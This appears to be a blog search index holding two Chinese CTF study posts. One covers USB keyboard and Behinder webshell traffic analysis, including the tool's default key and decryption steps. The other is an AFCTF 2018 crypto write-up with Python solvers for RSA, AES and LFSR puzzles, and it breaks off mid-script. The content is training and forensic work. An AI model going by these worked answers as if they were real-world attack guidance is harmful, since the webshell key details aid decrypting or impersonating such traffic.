<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MISC基础篇-流量分析</title>
    <link href="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>本文用来记录我的流量分析学习之路，主要包括自己遇到的一些题目和学习大佬博客学到的一些东西，之前的流量分析一直都是零零碎碎的学的，这次准备做一个整合，以后也会在遇见新题型时实时更新(●⁰౪⁰●)<br>参考：<br><a href="https://goodlunatic.github.io/posts/5422d65/">Misc-Network Traffic Analysis - ⚡Lunatic BLOG⚡</a></p><h2 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h2><h3 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h3><p>在键盘流量分析中，最重要的就是8字节的<code>usbhid</code>数据，我们的目的就是提取出这些<code>hid</code>数据，然后我们便可以还原出按键记录。<br>需要注意的是，有些题目会用<code>&lt;DEL&gt;</code>按键，如果忽略该按键就会不知道出题人删除了哪些数据。</p><h2 id="Webshell流量分析"><a href="#Webshell流量分析" class="headerlink" title="Webshell流量分析"></a>Webshell流量分析</h2><h3 id="冰蝎流量分析"><a href="#冰蝎流量分析" class="headerlink" title="冰蝎流量分析"></a>冰蝎流量分析</h3><p>冰蝎的默认密钥：<code>e45e329feb5d925b</code>（该密钥为默认连接密码<code>rebeyond</code>32位md5值的前16位）<br>在流量包中寻找木马时，可以使用下面语句进行过滤：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http.request.method==<span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161305614.png"><br>找到最可疑的流量，然后右键追踪流，大概率能够看见加密代码<br><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161454680.png"><br>我们通过加密代码可疑确定，该木马进行了AES128+BASE64的加密，因此我们可以使用密码对数据包进行解密，一般是AES-CBC模式，IV是：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br></code></pre></td></tr></table></figure><p><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161759498.png"><br>再还原得到的BASE64数据一般就能得到想要的信息。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFCTF 2018 Writeup</title>
    <link href="/2025/07/31/AFCTF%202018%20Writeup/"/>
    <url>/2025/07/31/AFCTF%202018%20Writeup/</url>
    
    <content type="html"><![CDATA[<p>NSSCTF Crypto刷题速通记录，目的是查漏补缺，有疑问欢迎交流ξ( ✿＞◡❛)</p><h1 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h1><p>给了一个很长的十六进制文件，导入CyberChef开始解码。说实话，感觉出题人有点无聊了。<br>下面是解码顺序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><h1 id="你能看出这是什么加密吗"><a href="#你能看出这是什么加密吗" class="headerlink" title="你能看出这是什么加密吗"></a>你能看出这是什么加密吗</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><br>q=<span class="hljs-number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><br>e=<span class="hljs-number">0x10001</span><br><br>c=<span class="hljs-number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span>   <br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p=<span class="hljs-number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><br>q=<span class="hljs-number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><br>e=<span class="hljs-number">0x10001</span><br><br>c=<span class="hljs-number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>n = p*q<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h1><p>直接在线网站破解：<br><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p>摩斯电码解码 -&gt; 十六进制数转字符</p><h1 id="Single"><a href="#Single" class="headerlink" title="Single"></a>Single</h1><p>观察代码发现是单表替换加密，直接quipquip在线解密即可： <a href="https://quipqiup.com/#google_vignette">https://quipqiup.com/#google_vignette</a></p><h1 id="可怜的RSA"><a href="#可怜的RSA" class="headerlink" title="可怜的RSA"></a>可怜的RSA</h1><p><strong>题目：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span>编码的密文 和 公钥PEM文件<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>在线解析公钥文件得到e和n<br>使用factordb分解n得到p和q<br>直接进行解密会发现不能出flag，这是因为加密过程中使用了OAEP填充<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br>n = <span class="hljs-number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span><br>e = <span class="hljs-number">65537</span><br>p =  <span class="hljs-number">3133337</span> <br>q = <span class="hljs-number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span><br>c = b64decode(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;可怜的RSA/flag.enc&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>pk = RSA.construct((n,e,d,p,q))<br>cipher = PKCS1_OAEP.new(pk)<br>m = cipher.decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h1 id="One-Secret-Two-encryption"><a href="#One-Secret-Two-encryption" class="headerlink" title="One Secret, Two encryption"></a>One Secret, Two encryption</h1><p><strong>题目：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">一份秘密发送给两个人不太好吧，那我各自加密一次好啦~~~  <br>素数生成好慢呀  <br>偷个懒也……不会有问题的吧？<br></code></pre></td></tr></table></figure><p>题目给了两组密文和公钥，解析后发现两组公钥的n不同，并结合题目所说，猜测两个n应该存在共同素数。<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">4850297138162223468826481623082440249579136876798312652735204698689613969008632545220976699170308454082390834742570718247804202060929493571642074679428565168405877110681518105667301785653517697684490982375078989886040451115082120928982588380914609273008153977907950532498605486225883973643141516024058315360572988744607134110254489421516026937249163493982681336628726033489124705657217768229058487155865265080427488028921879608338898933540825564889012166181346177276639828346376362168934208822467295673761876965864573164529336885250577357767314256581019474130651412100897839606491189424373959244023695669653213498329</span><br>n2 = <span class="hljs-number">2367536768672000959668181171787295271898789288397672997134843418932405959946739637368044420319861797856771490573443003520137149324080217971836780570522258661419034481514883068092752166752967879497095564732505614751532330408675056285275354250157955321457579006360393218327164804951384290041956551855334492796719901818165788902547584563455747941517296875697241841177219635024461395596117584194226134777078874543699117761893699634303571421106917894215078938885999963580586824497040073241055890328794310025879014294051230590716562942538031883965317397728271589759718376073414632026801806560862906691989093298478752580277</span><br>e = <span class="hljs-number">65537</span><br>p = GCD(n1, n2)<br>q = n2 // p<br>c2 = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;One Secret, Two encryption/flag_encry2&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())<br>d = inverse(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="MagicNum"><a href="#MagicNum" class="headerlink" title="MagicNum"></a>MagicNum</h1><p><strong>题目：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">72065910510177138000000000000000.000000<br>71863209670811371000000.000000<br>18489682625412760000000000000000.000000<br>72723257588050687000000.000000<br>4674659167469766200000000.000000<br>19061698837499292000000000000000000000.000000<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>本题应该是MISC题，根据分析，题目应该是要转换成IEEE 754单精度浮点数小端序，然后再转换ASCII字符<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>nums = [<span class="hljs-number">72065910510177138000000000000000.000000</span>,<br>        <span class="hljs-number">71863209670811371000000.000000</span>,<br>        <span class="hljs-number">18489682625412760000000000000000.000000</span>,<br>        <span class="hljs-number">72723257588050687000000.000000</span>,<br>        <span class="hljs-number">4674659167469766200000000.000000</span>,<br>        <span class="hljs-number">19061698837499292000000000000000000000.000000</span><br>        ]<br>a = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    a += struct.pack(<span class="hljs-string">&#x27;&lt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()  <span class="hljs-comment">#IEEE 754单精度浮点数小端序十六进制</span><br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(a,<span class="hljs-number">16</span>)))<br></code></pre></td></tr></table></figure><h1 id="MyOwnCBC"><a href="#MyOwnCBC" class="headerlink" title="MyOwnCBC"></a>MyOwnCBC</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MyOwnCBC</span>(<span class="hljs-params">key, plain</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key)!=<span class="hljs-number">32</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error!&quot;</span><br>cipher_txt = <span class="hljs-string">b&quot;&quot;</span><br>cipher_arr = []<br>cipher = AES.new(key, AES.MODE_ECB, <span class="hljs-string">&quot;&quot;</span>)<br>plain = [plain[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plain), <span class="hljs-number">32</span>)]<br><span class="hljs-built_in">print</span>(plain)<br>cipher_arr.append(cipher.encrypt(plain[<span class="hljs-number">0</span>]))<br>cipher_txt += cipher_arr[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(plain)):<br>cipher = AES.new(cipher_arr[i-<span class="hljs-number">1</span>], AES.MODE_ECB, <span class="hljs-string">&quot;&quot;</span>)<br>cipher_arr.append(cipher.encrypt(plain[i]))<br>cipher_txt += cipher_arr[i]<br><span class="hljs-keyword">return</span> cipher_txt<br><br>key = random.getrandbits(<span class="hljs-number">256</span>)<br>key = long_to_bytes(key)<br><br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>s = f.read()<br>f.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag_cipher&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(MyOwnCBC(key, s))<br>f.close()<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>根据代码分析，可以发现题目对明文进行了AES分组加密，但是只有第一组是使用随机生成的密钥加密的，后面其他组都是使用前一组的密文作为密钥进行加密的，也就是说，除了第一组，其他所有组的密钥我们都知道，可以求出除了第一组外的所有明文。<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;MyOwnCBC/flag_cipher&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>c = f.read()<br>f.close()<br><span class="hljs-comment">#print(c)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MyOwnCBC_decrypt</span>(<span class="hljs-params">cipher_txt</span>):<br>cipher_arr = [cipher_txt[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_txt), <span class="hljs-number">32</span>)]<br>plain_txt = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-comment">#print(cipher_arr)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher_arr)-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>plain = AES.new(cipher_arr[i-<span class="hljs-number">1</span>], AES.MODE_ECB)<br><span class="hljs-comment">#print(cipher_arr[i-1])</span><br>plain_txt = plain.decrypt(cipher_arr[i]) + plain_txt<br><span class="hljs-keyword">return</span> plain_txt<br><br>m = MyOwnCBC_decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h1 id="Tiny-LFSR"><a href="#Tiny-LFSR" class="headerlink" title="Tiny LFSR"></a>Tiny LFSR</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify<br><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">4</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python Encrypt.py keyfile plaintext ciphername&quot;</span>)<br>exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr</span>(<span class="hljs-params">R, mask</span>):<br>output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffffffffffff</span><br>lastbit=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>i=i&gt;&gt;<span class="hljs-number">1</span><br>output^=lastbit<br><span class="hljs-keyword">return</span> (output,lastbit)<br><br>R = <span class="hljs-number">0</span><br>key = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>key = f.read()<br>R = <span class="hljs-built_in">int</span>(key,<span class="hljs-number">16</span>)<br>f.close<br><br>mask = <span class="hljs-number">0b1101100000000000000000000000000000000000000000000000000000000000</span><br><br>a = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [key[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">2</span>)]])<br><br>f=<span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">2</span>],<span class="hljs-string">&quot;r&quot;</span>)<br>ff = <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">3</span>],<span class="hljs-string">&quot;wb&quot;</span>)<br>s = f.read()<br>f.close()<br>lent = <span class="hljs-built_in">len</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br>ff.write((<span class="hljs-built_in">ord</span>(s[i])^<span class="hljs-built_in">ord</span>(a[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a), lent):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp &lt;&lt; <span class="hljs-number">1</span>)^out<br>    ff.write((tmp^<span class="hljs-built_in">ord</span>(s[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>ff.close()<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>题目给出了一组对应的明密文文件，我们通过分析可以发现，通过明密文直接异或的前一部分便是key。<br>因此我们可以直接恢复出key，由于加解密都是异或操作，所以使用得到的密钥，结合题目文件的加密再对<code>flag_encode.txt</code>进行一次加密即可得到明文。<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">plaintext = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\Plain.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>ciphertext = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\cipher.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>key_bytes = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(plaintext), <span class="hljs-built_in">len</span>(ciphertext))):<br>    key_bytes.append(plaintext[i] ^ ciphertext[i])<br><br>key = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;%02x&#x27;</span> % b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> key_bytes])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered key:&quot;</span>, key)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr</span>(<span class="hljs-params">R, mask</span>):<br>output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffffffffffff</span><br>lastbit=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>i=i&gt;&gt;<span class="hljs-number">1</span><br>output^=lastbit<br><span class="hljs-keyword">return</span> (output,lastbit)<br><br>R = <span class="hljs-built_in">int</span>(key,<span class="hljs-number">16</span>)<br>mask = <span class="hljs-number">0b1101100000000000000000000000000000000000000000000000000000000000</span><br><br>a = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [key[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">2</span>)]])<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\flag_encode.txt&quot;</span>,<span 